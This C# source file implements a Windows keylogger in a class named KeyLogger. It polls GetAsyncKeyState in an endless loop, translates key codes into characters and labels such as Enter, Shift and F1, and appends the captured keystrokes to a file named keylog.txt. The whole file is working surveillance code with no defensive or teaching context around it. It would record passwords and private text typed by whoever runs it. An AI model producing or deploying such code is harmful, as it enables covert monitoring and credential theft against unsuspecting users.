using System.IO;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    class KeyLogger
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        public void ReadKeys()
        {
            string buffer = "";
            while (true)
            {
                for (int i = 0; i < 200; ++i)
                {
                    int keyPressed = GetAsyncKeyState(i);
                    if (keyPressed == 32769)
                        switch (i)
                        {
                            case 8:
                                buffer += " Backspace ";
                                break;
                            case 9:
                                buffer += " Tab ";
                                break;
                            case 13:
                                buffer += " Enter ";
                                break;
                            case 16:
                                buffer += " Shift ";
                                break;
                            case 20:
                                buffer += " CapsLock ";
                                break;
                            case 27:
                                buffer += " Esc ";
                                break;
                            case 32:
                                buffer += " Space ";
                                break;
                            case 33:
                                buffer += " Page up ";
                                break;
                            case 34:
                                buffer += " Page Down ";
                                break;
                            case 35:
                                buffer += " End ";
                                break;
                            case 36:
                                buffer += " Home ";
                                break;
                            case 112:
                                buffer += " F1 ";
                                break;
                            case 113:
                                buffer += " F2 ";
                                break;
                            case 114:
                                buffer += " F3 ";
                                break;
                            case 115:
                                buffer += " F4 ";
                                break;
                            case 116:
                                buffer += " F5 ";
                                break;
                            case 117:
                                buffer += " F6 ";
                                break;
                            case 118:
                                buffer += " F7 ";
                                break;
                            case 119:
                                buffer += " F8 ";
                                break;
                            case 120:
                                buffer += " F9 ";
                                break;
                            case 121:
                                buffer += " F10 ";
                                break;
                            case 160:
                                buffer += " Left shift ";
                                break;
                            case 161:
                                buffer += " Right shift ";
                                break;

                            default:
                                buffer += (char)i;
                                break;
                        }
                }

                if (buffer.Length >= 8)
                {
                    SaveData("keylog.txt", buffer);
                    buffer = "";
                }
            }
        }

        public void SaveData(string path, string data)
        {
            File.AppendAllText(path, data);
        }

    }
}